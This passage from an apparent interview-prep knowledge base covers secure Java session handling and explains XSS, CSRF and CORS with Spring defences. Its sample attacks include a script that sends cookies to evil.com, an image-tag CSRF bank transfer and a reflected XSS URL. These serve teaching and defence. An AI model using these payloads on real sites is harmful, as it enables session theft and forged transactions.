        c.setHttpOnly(true);  // JS cannot read it
        c.setSecure(true);    // HTTPS only
        c.setAttribute("SameSite", "Strict");
        c.setMaxAge(8 * 3600);
        resp.addCookie(c);
        return token;
    }

    // True logout: invalidate server-side
    public void logout(String token,
            HttpServletResponse resp) {
        sessions.delete(token); // server-side invalidation
        Cookie c = new Cookie("session", "");
        c.setMaxAge(0);     // clear client cookie
        c.setHttpOnly(true);
        c.setSecure(true);
        resp.addCookie(c);
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: a complete secure authentication implementation covering all three failure modes from the bad example - bcrypt with appropriate cost, cryptographically random session tokens, and server-side session invalidation on logout. (2) KEY MECHANISM: `SecureRandom` uses the OS's cryptographic entropy source (CSPRNG); the resulting 128-bit token has 2^128 possibilities, making brute-force impractical; BCrypt automatically generates a per-password salt, defeating rainbow tables. (3) WHY IT MATTERS: combining cryptographic randomness for session tokens with server-side invalidation means neither session prediction nor replay after logout is possible. (4) WHAT BREAKS: the one remaining risk is session token theft via XSS - mitigated by HttpOnly (prevents JS from reading the cookie) and by Content Security Policy. (5) TAKEAWAY: defense-in-depth for sessions requires getting all three right: generation (random), transmission (HttpOnly+Secure), and termination (server-side delete).

---

### 🎓 Answers by Seniority

**Junior / Mid (0-5 years):**
> Broken authentication includes weak password storage (MD5 instead of bcrypt),
> no rate limiting on login (allows brute force), and session tokens that don't
> expire. The fixes are: bcrypt for passwords, rate limiting authentication
> endpoints, expire sessions after inactivity, and use cryptographically random
> session tokens with HttpOnly and Secure flags.

*Push deeper:* Explain the difference between HttpOnly (prevents JS access to cookie)
and Secure (HTTPS only) flags and why both are needed.

---

**Senior / Staff (5+ years):**
> Authentication is defense-in-depth: you need secure credential storage, secure
> session management, brute-force resistance, and secure recovery flows - and each
> of them has to be correct simultaneously. The failure mode I watch most carefully
> is the interaction between components: a correct bcrypt implementation with an
> incomplete logout is still exploitable. For high-value systems, I add MFA as an
> additional layer - TOTP (Time-based OTP) or WebAuthn (FIDO2, phishing-resistant).
> For APIs, I use short-lived JWTs (15-minute access tokens) with opaque refresh
> tokens stored server-side so revocation is possible. The non-obvious design
> decision is where to store the refresh token - storing it in localStorage
> makes it accessible to XSS; storing it in a HttpOnly cookie prevents XSS access
> but makes CSRF a concern (mitigated by SameSite=Strict).

*Push deeper:* Discuss token revocation strategies for distributed systems - a
JWT is stateless and valid until expiry, so revoking it requires either a
blocklist (adds state back) or very short expiry (adds latency for token refresh).

---

### ⚠️ Common Misconceptions

**Misconception 1: HTTPS protects session tokens from theft.**

HTTPS protects tokens in transit between browser and server. It does not protect
against XSS (JavaScript theft from the DOM), CSRF (cross-site request forgery using
the cookie), or server-side session store compromise. HttpOnly cookies (prevent
XSS), SameSite=Strict (prevent CSRF), and session store security address these
threats; HTTPS alone does not.

**Misconception 2: Logging out clears the session.**

Client-side cookie deletion does not invalidate the session server-side. If an
attacker has captured the session token (via network sniffing, XSS, or log
access), they can continue using it after the user "logs out" unless the server
explicitly deletes the session record. Always invalidate server-side on logout.

**Misconception 3: Strong passwords eliminate the need for rate limiting.**

Credential stuffing attacks use correct passwords (leaked from other breaches).
Rate limiting is not about stopping guessing - it is about limiting automated
testing of breach databases against your system. Even with strong unique passwords,
users reuse them. Rate limiting on authentication endpoints is mandatory.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: JWT without expiry or revocation.**

Symptom: a user whose account is compromised and password reset still has active
API access because their JWT has no expiry or there is no revocation mechanism.
Diagnosis: check JWT claims for `exp` field; verify short expiry (15-30 min for
access tokens); implement a token blocklist or use opaque refresh tokens with
server-side invalidation.

**Failure Mode 2: Password reset tokens that do not expire.**

Symptom: a user receives a password reset email, does not use it, and six months
later the link still works.
Diagnosis: check reset token generation - tokens must have a short TTL (15-60
minutes), be single-use (mark as used on redemption), and be invalidated when
a new reset is requested.

**Failure Mode 3: Session fixation.**

Symptom: attacker tricks user into using a pre-established session ID; after
the user logs in, the attacker has an authenticated session.
Diagnosis: check whether your auth system generates a new session ID after
successful login (it must). Spring Security's `sessionFixation().newSession()`
is the correct configuration.

---

### ⚖️ Comparison Table

*(Omit: ★☆☆ foundational. Authentication mechanisms are compared in L2 Authentication entry.)*

---

### 🏛️ System Design

*(Omit: ★☆☆ foundational. Authentication system design covered in L4 OAuth Internals entry.)*

---

### 📊 Diagram

*(Omit: the lifecycle diagram in Concept Explanation is sufficient for this foundational concept.)*

---

### 🎯 Interview Deep-Dive

| Question Category | Count | Coverage |
|---|---|---|
| Definition | 1 | What broken auth is, why it matters |
| Mechanism | 2 | How specific attacks work |
| Scenario | 2 | Designing secure auth flows |
| Debugging | 1 | Detecting auth attacks |
| Trade-off | 1 | Stateless vs stateful sessions |

---

**[JUNIOR] Q1 (Definition): Why is MD5 or SHA-1 not acceptable for password storage?**

MD5 and SHA-1 were designed for speed - they can hash billions of values per
second on modern hardware. Password storage requires the opposite: a slow function
that is computationally expensive to reverse or brute-force.

When an attacker obtains a database of MD5-hashed passwords, they can use a modern
GPU to test 10-100 billion MD5 hashes per second against a dictionary of common
passwords and their variations. A 6-character alphanumeric password is cracked in
seconds; a dictionary word with common substitutions (p4ssw0rd) is cracked
in milliseconds.

Additionally, MD5 and SHA-1 lack salting by default. Without a unique per-password
salt, two users with the same password have identical hashes - allowing rainbow
table attacks (precomputed hash-to-password mappings) to crack many accounts at once.

bcrypt, scrypt, and Argon2 are designed for password storage. They are intentionally
slow (bcrypt cost factor 12 takes ~250ms per hash), include a built-in per-password
random salt, and are adjustable as hardware improves. An attacker with the same
hardware can test roughly 100-200 bcrypt hashes per second - 10 million times
slower than MD5.

*What separates good from great:* Understanding that "password hashing" and
"cryptographic hashing" serve different purposes. SHA-256 is excellent for data
integrity checks (fast, deterministic). It is wrong for passwords because that
same speed makes brute-force viable. bcrypt's slowness is a feature, not a bug.

---

**[MID] Q2 (Mechanism): How does a session fixation attack work and how do you prevent it?**

Session fixation occurs when an attacker can force a victim to use a session
ID that the attacker controls. After the victim authenticates with that session,
the attacker uses the same session ID to access the victim's authenticated session.

Attack flow: (1) The attacker obtains a valid but unauthenticated session token
from the application (e.g., by visiting the login page, which issues a session
cookie). (2) The attacker tricks the victim into using this token - through a
URL parameter (`?sessionid=attacker_chosen_value` in old applications that
accepted session IDs via URL), or by setting a subdomain cookie, or via XSS.
(3) The victim logs in using this token. If the application uses the same
session ID before and after authentication, it is now an authenticated session.
(4) The attacker uses the known session ID to make authenticated requests.

The fix is simple and mandatory: generate a completely new session ID on successful
authentication, regardless of whether a session existed before login. The pre-login
session (unauthenticated state) must be discarded and replaced with a new,
unpredictable, cryptographically random session ID that the attacker does not know.

In Spring Security: `http.sessionManagement().sessionFixation().newSession()`
(creates entirely new session, copying only the authentication attributes) or
`.changeSessionId()` (changes only the ID, preserves session attributes).

*What separates good from great:* Understanding why this is distinct from session
hijacking. Fixation gives the attacker a session ID before authentication and
relies on the application reusing it. Hijacking steals an already-authenticated
session. The prevention for fixation is session regeneration on login; the
prevention for hijacking is token confidentiality (HTTPS, HttpOnly cookies,
short expiry).

---

**[MID] Q3 (Mechanism): Explain MFA and when TOTP is not sufficient.**

Multi-Factor Authentication requires verifying two or more factors from different
categories: something you know (password), something you have (phone, hardware
key), something you are (biometric). TOTP (Time-based One-Time Password,
RFC 6238) is the most common "something you have" factor - apps like Google
Authenticator generate a 6-digit code from a shared secret and the current time.

TOTP security: the code changes every 30 seconds, so an intercepted code is
valid for at most ~30 seconds (servers typically allow a one-step window for
clock drift). This defeats password replay attacks. TOTP is substantially better
than SMS OTP (which is vulnerable to SIM swapping).

When TOTP is insufficient: (1) Phishing attacks. Real-time phishing proxies
(Modlishka, Evilginx) create a fake login page that proxies credentials AND the
TOTP code to the real site simultaneously, in real-time. Since TOTP codes are
valid for 30 seconds, the attacker has enough time to replay the stolen code.
(2) MFA fatigue attacks. If MFA is delivered as a push notification (Duo,
Microsoft Authenticator), attackers who have the password spam authentication
requests hoping the user approves one out of frustration.

FIDO2/WebAuthn (hardware security keys, device biometrics) is phishing-resistant
because the authentication is bound to the specific origin URL - a phishing site
at evil.com cannot request authentication for login.company.com. Even if the
user is on the phishing site, the authenticator refuses to sign for the wrong
origin.

For high-value systems (admin access, financial operations), FIDO2/WebAuthn is
the correct choice. TOTP is appropriate for general user MFA.

*What separates good from great:* Understanding the attacker's perspective. TOTP
adds a layer that raises the cost of account takeover for bulk credential stuffing
attacks. It does not prevent targeted phishing attacks on specific high-value
accounts. The solution for targeted attacks is phishing-resistant MFA.

---

**[SENIOR] Q4 (Scenario): Design the authentication system for a banking application
with 2M users. What are your key design decisions?**

A banking application has the highest authentication security requirements:
regulatory compliance (PCI-DSS, local banking regulations), protection against
targeted attacks, and user experience requirements (friction is a business cost).

Key design decisions:

Identity provider vs custom: I would use a battle-tested identity provider
(Okta, Auth0, or an on-premise equivalent like Keycloak) rather than building
custom authentication. The complexity of getting every edge case right (session
fixation, token rotation, concurrent session management, secure recovery flows)
is enormous. Using a dedicated IdP offloads that complexity to specialists and
provides a security audit trail.

Credential requirements: minimum 12 characters, password strength meter rather
than character class requirements (length beats complexity), breached password
check (HaveIBeenPwned API) to reject credentials in known breach databases.

MFA: mandatory for all transactions above a threshold amount; TOTP as default
for general login; push notification with explicit transaction details (not just
"approve login") for high-value operations. Offer hardware key (FIDO2) for
premium/business accounts.

Session design: short-lived JWTs (15 minutes) for API access; opaque refresh
tokens stored server-side (allows revocation); idle timeout 15 minutes, absolute
timeout 8 hours; separate session for high-value operations (re-authenticate
before transfer initiation even within an active session - "step-up auth").

Anomaly detection: impossible travel detection (same account, two locations that
cannot be physically reached in elapsed time); new device fingerprinting; unusual
transaction time/amount patterns trigger step-up authentication.

*What separates good from great:* The step-up authentication design - even an
active authenticated session requires re-authentication for high-value operations.
This limits the blast radius of session compromise to low-value operations
(viewing account balance) while protecting high-value ones (initiating transfers).

---

**[SENIOR] Q5 (Debugging): Your ops team alerts you that login success rates have
dropped from 95% to 40% for the past hour. What is happening and how do you diagnose?**

A sudden drop in login success rate from 95% to 40% is a strong signal of
credential stuffing. 40% success rate suggests the attacker is using a high-quality
breach database (not random passwords) against your users - attackers with good
databases see 30-50% success on first pass.

Diagnosis steps: Check authentication logs. If the failure pattern is: (a) many
different usernames from (b) a small set of IP addresses or ASN ranges attempting
(c) different passwords per username - this is credential stuffing. Normal failed
logins come from individual IPs with few attempts per username.

Check IP ranges: `SELECT remote_ip, COUNT(*) cnt FROM auth_logs WHERE status='FAILED'
AND created_at > NOW() - INTERVAL '1 hour' GROUP BY remote_ip ORDER BY cnt DESC
LIMIT 20`. Credential stuffing often uses datacenter or proxy IP ranges.

Mitigation while diagnosing: add a CAPTCHA challenge after 3 failed attempts per
username (increases cost for automated attacks); rate limit by IP and by username;
block known credential-stuffing IP ranges (check against ipinfo.io or MaxMind ASN data).

Longer term: deploy breach credential detection (HaveIBeenPwned integration to
reject compromised passwords); enable MFA for accounts with successful logins from
new IPs; implement device fingerprinting to flag new-device logins.

Notify affected users: anyone who had a successful login in this window from an
unusual IP should be notified and prompted to change their password and enable MFA.

*What separates good from great:* Understanding that the 40% success rate reveals
something about the attacker's data quality. An attacker with a fresh, high-quality
breach database from your industry will have higher success rates because users
reuse passwords. The defense is less about blocking the attack and more about
making stolen passwords useless (MFA, breach detection on registration/login).

---

**[SENIOR] Q6 (Trade-off): Stateless JWT vs stateful session tokens - when do you
choose each?**

Stateless JWTs and stateful session tokens represent a fundamental trade-off
between scalability/simplicity and control/security.

Stateless JWT: the token is self-contained - it carries the user's identity and
claims encoded and signed. Any server that has the signing key can validate it
without a database lookup. This enables horizontal scaling without session
state synchronization; it is ideal for microservices where each service needs
to validate identity without a central session store.

The cost of statelessness: revocation is impossible without adding state back.
If a JWT is stolen or a user's account is compromised, the JWT remains valid
until expiry. You can maintain a blocklist (adds a database lookup - the state
you tried to avoid) or use very short expiry (15 minutes) and accept that a
stolen token has a 15-minute validity window.

Stateful session tokens: the token is an opaque reference to a server-side
session record. Validation requires a lookup in the session store (Redis,
database). This lookup is the latency cost. The benefit: instant revocation -
delete the session record and all requests with that token immediately fail.

My decision framework: for user-facing web applications where session revocation
is important (banking, healthcare, anything where account compromise needs
immediate response), stateful sessions are preferable. For API-to-service
communication in microservices where JWTs propagate user identity across service
boundaries, short-lived stateless JWTs plus opaque refresh tokens at the perimeter
give the best balance.

Hybrid: stateless JWT for access tokens (short-lived: 15 min); stateful opaque
refresh tokens (long-lived: 7 days, stored server-side for revocation). The
refresh token can be revoked immediately; the access token has a maximum 15-minute
validity window.

*What separates good from great:* Recognizing that "stateless" does not mean
"no state" - it means the state is in the token rather than in the server. And
that state in the token is harder to revoke. The 15-minute access token window
is a deliberate security parameter, not an arbitrary choice.

---

**[STAFF] Q7 (Deep Dive): How should authentication be designed for a platform
serving both web users and third-party API clients?**

Web users and API clients have fundamentally different authentication requirements,
and designing a unified system that handles both requires separating concerns clearly.

Web user authentication: session-based (cookie with HttpOnly, Secure, SameSite=Strict)
or OAuth 2.0 Authorization Code Flow with PKCE. Web users authenticate interactively
with a login page. Sessions should have idle and absolute timeouts. MFA is viable
(users can complete a TOTP challenge). CSRF protection is required for session-based
auth because cookies are sent automatically with cross-site requests.

API client authentication: OAuth 2.0 Client Credentials flow for server-to-server
(machine-to-machine) clients; OAuth 2.0 Authorization Code Flow with PKCE for
third-party apps acting on behalf of users. API clients use client ID + client
secret for machine-to-machine, or access tokens (JWTs) for user-delegated access.
CSRF is not applicable (API clients set the Authorization header explicitly).

The platform: implement an OAuth 2.0 authorization server (Keycloak, Auth0, Okta,
or cloud provider IAM). The auth server handles both web session issuance and
API token issuance. Web users get sessions after authenticating with the auth
server; third-party apps get access tokens by going through the authorization
code flow with the user's explicit consent.

Token scoping: define fine-grained OAuth scopes (read:orders, write:payments)
so third-party apps request only the permissions they need. Users see a consent
screen listing requested permissions. This limits blast radius if a third-party
app is compromised - their access is limited to the scopes they requested.

Revocation: users can revoke third-party app access from their account settings.
The auth server deletes the associated refresh token, preventing future access
token renewal. Machine-to-machine client secrets can be rotated without user
interaction.

*What separates good from great:* Designing for the attack surface of each client
type separately. Web sessions are vulnerable to CSRF and XSS; API tokens are
vulnerable to leakage in logs and version control. Different controls for different
channels (SameSite for sessions, secret rotation for API clients) produce a
more robust system than trying to use one mechanism for both.

---

---

# XSS, CSRF, and CORS Security

---
id: SEC-006
title: "XSS, CSRF, and CORS Security"
category: Security
difficulty: ★☆☆
interview_weight: critical
asked_at: All
seniority: all
tags: #security, #xss, #csrf, #cors, #web-security, #browser-security
status: draft
sd: false
version: 1
---

🎯 Interview Weight: Critical - three fundamental browser-security vulnerabilities grouped together; asked in every frontend and full-stack security interview and increasingly in backend roles that serve web clients.

---

### 🎯 Model Answer

**30 seconds:**
> XSS (Cross-Site Scripting) lets attackers inject malicious JavaScript into
> pages served to victims. CSRF (Cross-Site Request Forgery) tricks users into
> submitting requests they did not intend to. CORS (Cross-Origin Resource Sharing)
> is a browser security mechanism that controls which origins can make cross-site
> requests - misconfigured CORS can undo the same-origin policy. XSS is prevented
> by output encoding; CSRF by CSRF tokens or SameSite cookies; CORS by carefully
> restricting allowed origins.

**3 minutes (Senior):**
> These three vulnerabilities all exploit the browser's trust model. XSS exploits
> the trust the victim's browser places in content served by the target site:
> if attacker-controlled JavaScript is served from login.bank.com, it runs in
> the bank's origin context with full access to the user's session cookie and
> can make authenticated API calls. CSRF exploits the automatic inclusion of
> cookies in cross-site requests: a malicious page at evil.com can trigger a
> form POST to bank.com/transfer and the browser automatically includes the bank
> session cookie. CORS is the defense against one type of cross-origin request -
> XMLHttpRequest and fetch - but not against form POST or image embedding. The
> non-obvious insight is that these three interact: a permissive CORS policy that
> reflects any Origin header (Access-Control-Allow-Origin: *) with credentials
> allowed is a CSRF bypass; and an XSS vulnerability renders all CSRF tokens
> useless (the XSS script can read and replay CSRF tokens). Defense-in-depth
> requires getting all three right simultaneously.

**Framework:** WHAT (each vulnerability) → HOW (attack mechanism) → INTERACTION (they can compound each other) → PREVENTION (layered defenses)

*Adapting up:* Senior/staff should discuss Content Security Policy as the meta-
defense against XSS, and how HttpOnly cookies interact with XSS and CSRF defenses.

*Adapting down:* Junior - "XSS = injected JavaScript, CSRF = tricked into sending
a request, CORS = controls cross-site requests. XSS: encode output. CSRF: use tokens
or SameSite cookies."

**Blank Mind Recovery:**

**(1) Restate:** "You are asking about browser-based web attacks - let me walk
through each one."

**(2) First principles:** "The browser has a same-origin policy that isolates
JavaScript contexts by origin. XSS breaks it from the inside (injecting code
into the origin). CSRF abuses the fact that cookies are sent automatically.
CORS is the mechanism that explicitly permits cross-origin access."

**(3) Bridge:** "These are all about the boundary between trusted and untrusted
origins. The same-origin policy is the fence; XSS is a hole in the fence;
CSRF is an attack that doesn't need to cross the fence; CORS is the gate."

---

### 📘 Concept Explanation

**What it is:**
Three related browser security vulnerabilities: XSS enables execution of attacker-
controlled JavaScript in the victim's browser under the target site's origin. CSRF
causes the victim's browser to submit state-changing requests to the target site
using the victim's credentials. CORS misconfiguration undermines the same-origin
policy by allowing unintended cross-origin access.

**The problem it solves:**
The browser's same-origin policy (SOP) is designed to prevent pages from one origin
from accessing resources at another origin. XSS, CSRF, and CORS misconfigurations
each bypass or undermine SOP in different ways, allowing attackers to act on behalf
of victims or access data they should not.

**How it works:**

```
XSS ATTACK:
  Attacker injects: <script>
    document.location='https://evil.com/steal?c='
    +document.cookie
  </script>
  -> Executed in victim's browser on target.com's origin
  -> Accesses target.com cookies, localStorage, DOM

CSRF ATTACK:
  User logged in to bank.com (cookie active)
  User visits evil.com containing:
    <img src="https://bank.com/transfer?to=attacker&amt=1000">
  -> Browser auto-includes bank.com cookie in GET request
  -> Transfer executes without user's knowledge

CORS MISCONFIGURATION:
  Server responds:
    Access-Control-Allow-Origin: *  (any origin)
    Access-Control-Allow-Credentials: true
  -> evil.com JavaScript can make authenticated requests
     to api.target.com and read responses!
  -> Note: * + credentials is invalid per spec but
     some servers implement it insecurely anyway
```

> **Code walkthrough:** (1) WHAT IT SHOWS: how a permissive CORS configuration with wildcard origin enables cross-site API access that bypasses the same-origin policy. (2) KEY MECHANISM: CORS headers are the server's permission grant to the browser; `Access-Control-Allow-Origin: *` tells every browser to allow any origin to read the response, defeating SOP for this endpoint. (3) WHY IT MATTERS: a wildcard CORS policy on an authenticated API allows any malicious site to call the API with the victim's credentials and read the response - equivalent to disabling SOP. (4) WHAT BREAKS: `*` plus `Access-Control-Allow-Credentials: true` is invalid per spec, but some servers reflect the Origin header in that case, creating a vulnerability despite the spec prohibition. (5) TAKEAWAY: CORS configuration is a security decision, not a DevOps convenience; wildcard origins are acceptable only for fully public, non-authenticated resources.

**The key insight:**
XSS renders CSRF protections useless: a CSRF token is a value in the DOM or
a JavaScript-accessible cookie, both readable by an XSS payload. The correct
priority order is: prevent XSS first (output encoding, CSP), because XSS
undermines every other browser-side defense.

**When to use each defense:**
- Output encoding: everywhere user content is rendered in HTML
- CSP: every web application regardless of content type
- CSRF tokens: every state-changing form or API endpoint
- SameSite cookies: all session cookies (Strict for non-CORS flows)
- CORS: only on endpoints intentionally accessed cross-origin

**When NOT to use permissive CORS:**
Never use `Access-Control-Allow-Origin: *` with credentials. Never dynamically
reflect the incoming Origin header without validating it against an allowlist.

**Alternatives:**
- SameSite=Strict - CSRF prevention without CSRF tokens (preferred modern approach)
- Content Security Policy - XSS mitigation (defense-in-depth)
- Subresource Integrity (SRI) - prevents CDN-based XSS injection

**First-principles derivation:**
The browser shares context between pages from the same origin (same protocol +
domain + port). XSS breaks this by injecting code that appears to come from
the trusted origin but is attacker-controlled. CSRF abuses the browser's
automatic credential attachment (cookies) to make cross-site requests look
authenticated. Both bypass the intent of the same-origin policy through
different mechanisms.

---

### 💻 Code Example

```java
// XSS: BAD - rendering user content without encoding
@Controller
public class CommentController {
    @GetMapping("/post/{id}")
    public String viewPost(@PathVariable Long id,
                           Model model) {
        Comment c = commentRepo.findById(id);
        // BAD: raw HTML from database goes to template
        // If comment contains <script>...</script>,
        // it executes in every viewer's browser!
        model.addAttribute("comment", c.getBody());
        return "post"; // template: ${comment}
    }
}
// In Thymeleaf template:
// BAD:  <p th:utext="${comment}"></p>   <!-- raw HTML -->
// GOOD: <p th:text="${comment}"></p>    <!-- auto-encoded -->
```

> **Code walkthrough:** (1) WHAT IT SHOWS: the difference between `th:utext` (unescaped HTML - dangerous) and `th:text` (auto-encoded text - safe) in Thymeleaf, and how the controller choice of which attribute to use determines whether stored XSS is possible. (2) KEY MECHANISM: `th:text` HTML-encodes special characters before rendering - `<` becomes `&lt;`, `>` becomes `&gt;`, `"` becomes `&quot;` - so script tags are displayed as text rather than executed. (3) WHY IT MATTERS: stored XSS persists in the database and executes for every user who views the page, potentially affecting thousands of users from a single injection. (4) WHAT BREAKS: `th:utext` should only be used for trusted HTML (generated internally), never for user-supplied content from any source. (5) TAKEAWAY: the template function name is the security control - use the encoding function by default; use the raw function only with explicit justification.

```java
// CSRF: Defense with CSRF tokens and SameSite cookies

// Spring Security CSRF protection (enabled by default)
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(
            HttpSecurity http) throws Exception {
        http
            // CSRF enabled by default in Spring Security
            // adds _csrf token to all forms and validates
            // on POST/PUT/DELETE/PATCH
            .csrf(csrf -> csrf
                .csrfTokenRepository(
                    CookieCsrfTokenRepository
                        .withHttpOnlyFalse()
                    // JS-accessible for SPA clients
                )
            )
            .sessionManagement(sm -> sm
                .sessionCreationPolicy(
                    SessionCreationPolicy.IF_REQUIRED)
            );
        return http.build();
    }
}

// Session cookie with SameSite (modern CSRF defense)
@Bean
public CookieSameSiteSupplier applicationCookieSameSite() {
    // SameSite=Strict prevents cookie from being sent
    // in cross-site requests entirely
    return CookieSameSiteSupplier.ofStrict();
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: two complementary CSRF defenses - CSRF tokens (classic approach) and SameSite cookie attribute (modern browser-based approach). (2) KEY MECHANISM: CSRF tokens work by requiring that every state-changing request include a value that is bound to the user's session and cannot be known by a cross-site attacker; SameSite=Strict works by instructing the browser not to include the session cookie in requests that originate from a different site, breaking CSRF at the cookie level. (3) WHY IT MATTERS: SameSite=Strict is the simpler and more robust defense for same-site applications; CSRF tokens are needed when the application must accept cross-origin requests. (4) WHAT BREAKS: SameSite=Strict breaks legitimate cross-site navigations that expect authentication (e.g., "login with Google" flows) - use SameSite=Lax for those cases. (5) TAKEAWAY: SameSite=Strict is the preferred modern CSRF defense; CSRF tokens are belt-and-suspenders for applications that need cross-origin support.

```java
// CORS: Correct restrictive configuration
@Configuration
public class CorsConfig {
    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        // BAD: wildcard origin - any site can read API responses
        // config.setAllowedOrigins(List.of("*"));
        // BAD: all methods exposed unnecessarily
        // config.setAllowedMethods(List.of("*"));

        CorsConfiguration config = new CorsConfiguration();

        // GOOD: explicit allowlist, not wildcard
        config.setAllowedOrigins(List.of(
            "https://app.company.com",
            "https://admin.company.com"
        ));
        // GOOD: only methods the API actually uses
        config.setAllowedMethods(
            List.of("GET", "POST", "PUT", "DELETE"));
        // GOOD: specific allowed headers
        config.setAllowedHeaders(
            List.of("Authorization", "Content-Type"));
        // GOOD: allow credentials only when needed
        config.setAllowCredentials(true);
        // Short max-age: recheck origin policy frequently
        config.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source =
            new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: a restrictive CORS configuration with an explicit origin allowlist, specific allowed methods and headers, and credentials permitted for the trusted origins. (2) KEY MECHANISM: the browser checks the CORS response headers before allowing JavaScript to read the response; if the requesting origin is not in the `Access-Control-Allow-Origin` list, the browser blocks the JavaScript from reading the response even if the server returned it. (3) WHY IT MATTERS: a permissive CORS configuration (`allowedOrigins("*")` with credentials) effectively disables the same-origin policy, allowing any website to make authenticated requests to the API on behalf of a victim user. (4) WHAT BREAKS: using `*` for allowed origins with `allowCredentials(true)` is rejected by the CORS spec (browsers will block it), but some frameworks silently reflect the Origin header in that case, creating a vulnerability. (5) TAKEAWAY: CORS configurations must be explicit and reviewed; wildcards with credentials are never correct.

---

### 🎓 Answers by Seniority

**Junior / Mid (0-5 years):**
> XSS is when attackers inject JavaScript into your pages. Prevent it by encoding
> all user output in HTML templates. CSRF is when a malicious site tricks a user's
> browser into sending requests. Prevent it with CSRF tokens or SameSite=Strict
> cookies. CORS is the browser's mechanism to control cross-origin requests - use
> an explicit allowlist of permitted origins, never wildcard with credentials.

*Push deeper:* Explain the difference between reflected XSS (payload in URL),
stored XSS (payload in database), and DOM-based XSS (payload in client-side code).

---

**Senior / Staff (5+ years):**
> I think about XSS, CSRF, and CORS as three different angles on the same underlying
> problem: the browser's trust model can be abused. XSS is the most dangerous because
> it undermines all other defenses - an XSS payload can read CSRF tokens, steal
> cookies even if HttpOnly is not set, and make authenticated requests to the API.
> My priority order: prevent XSS with output encoding and a strict CSP (restricts
> which scripts can execute); prevent CSRF with SameSite=Strict for same-site apps
> or CSRF tokens for cross-site; configure CORS with explicit origin allowlists.
> The CSP is my defense-in-depth layer - even if output encoding misses one case,
> a CSP that prohibits inline scripts and restricts script sources limits the
> damage an attacker can do with a successful injection.

*Push deeper:* Discuss Content Security Policy Level 3 features: nonces (per-request
random values in script tags, defeating inline injection) and strict-dynamic (allows
scripts to load other scripts trusted by the nonce).

---

### ⚠️ Common Misconceptions

**Misconception 1: CORS prevents CSRF.**

CORS controls what cross-origin JavaScript can read from a response. It does NOT
prevent cross-origin requests from being sent. An HTML form POST from evil.com
to bank.com will be sent by the browser even with restrictive CORS, because HTML
forms are not subject to CORS preflight. CORS and CSRF protection (tokens or
SameSite) are separate concerns.

**Misconception 2: HttpOnly cookies prevent XSS completely.**

HttpOnly prevents JavaScript from reading the cookie value (preventing direct
cookie theft). It does not prevent an XSS payload from using the cookie implicitly:
an XSS script can make authenticated API requests (the browser includes the
HttpOnly cookie automatically in same-origin requests), change account settings,
or extract sensitive page content - all without reading the cookie. HttpOnly
is one layer; it does not substitute for preventing XSS.

**Misconception 3: A WAF prevents XSS.**

WAFs detect known XSS payloads via signature matching. Attackers use obfuscation
(Unicode escapes, HTML entities, alternative event handlers) to bypass WAF signatures.
WAFs reduce automated attacks but are not reliable against targeted XSS.
Output encoding in the application is the reliable defense; WAF is defense-in-depth.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: DOM-based XSS from JavaScript using location.hash.**

Symptom: stored XSS prevention is in place but XSS is still possible via URL
fragment. Code like `document.getElementById('target').innerHTML = location.hash`
is vulnerable to DOM XSS - the source is the URL, not the database.
Diagnosis: code search for `innerHTML`, `outerHTML`, `document.write`,
`eval()`, `setTimeout(string)` combined with `location.hash`, `location.search`,
or `window.name`.

**Failure Mode 2: CORS wildcard introduced by middleware misconfiguration.**

Symptom: `Access-Control-Allow-Origin: *` header appears on API endpoints that
handle authenticated data - introduced by a middleware that sets CORS headers
before authentication.
Diagnosis: check CORS response headers for all protected endpoints; grep source
code for `cors()`, `addCorsMappings`, `setAllowedOrigins("*")`.

**Failure Mode 3: CSRF token bypassed via subdomain XSS.**

Symptom: CSRF tokens are correctly implemented but an XSS on a subdomain
(sub.company.com) can read the CSRF token from the main application (company.com)
if `domain=.company.com` is set on the cookie.
Diagnosis: review all subdomains for XSS vulnerabilities; restrict CSRF cookie
domain to the exact hostname, not the parent domain.

---

### ⚖️ Comparison Table

*(Omit: ★☆☆ foundational. These three are distinct attack categories, not alternatives to each other.)*

---

### 🏛️ System Design

*(Omit: ★☆☆ foundational. Browser security in system design context covered in L3+ entries.)*

---

### 📊 Diagram

*(Omit: the ASCII attack flow diagrams in Concept Explanation adequately illustrate all three mechanisms.)*

---

### 🎯 Interview Deep-Dive

| Question Category | Count | Coverage |
|---|---|---|
| Definition | 2 | XSS types, CSRF mechanism |
| Mechanism | 1 | How CSP prevents XSS |
| Scenario | 2 | Finding vulnerabilities, designing defenses |
| Debugging | 1 | Detecting XSS in production |
| Trade-off | 1 | SameSite options |

---

**[JUNIOR] Q1 (Definition): What are the three types of XSS?**

The three types of XSS differ in where the malicious script is stored and how
it reaches victims.

Reflected XSS: the malicious script is in the URL as a query parameter or path
segment. The server reflects the input in the response without storing it. The
attacker crafts a malicious URL and tricks victims into clicking it. The script
executes once in the victim's browser. Example: `https://site.com/search?q=
<script>steal()</script>`. Reflected XSS requires tricking the victim into
clicking the link; it affects one victim at a time.

Stored XSS: the malicious script is saved in the server's database (in a
comment, profile field, message, etc.) and served to all users who view that
content. This is the most dangerous type because it affects every visitor
without requiring them to click a specific link. One injection can attack
thousands of users.

DOM-based XSS: the vulnerability is in client-side JavaScript that reads from
a source (URL fragment, localStorage, window.name) and writes to a sink
(innerHTML, eval, document.write) without sanitization. The server is not involved
and may never see the payload - it executes entirely in the client. Modern single-
page applications with heavy client-side routing are particularly vulnerable.

All three result in attacker-controlled JavaScript executing in the victim's browser
under the target site's origin - the impact is the same; only the delivery mechanism
differs.

*What separates good from great:* Knowing that DOM-based XSS is the most commonly
missed because it does not appear in server-side code reviews or server logs. Code
review must include client-side JavaScript, looking for dangerous sink functions
used with uncontrolled sources.

---

**[MID] Q2 (Definition): How does a CSRF attack work against a bank?**

Cross-Site Request Forgery exploits the browser's automatic inclusion of cookies
in cross-site requests. The attacker needs two conditions: the victim has an active
session at the target site, and the target site performs state changes based on
cookie authentication alone (no CSRF token or SameSite protection).

Attack flow: the victim logs in to bank.com. Their browser stores a session cookie
for bank.com. The attacker hosts a page at evil.com containing a form or image
that submits a request to bank.com. When the victim visits evil.com (perhaps
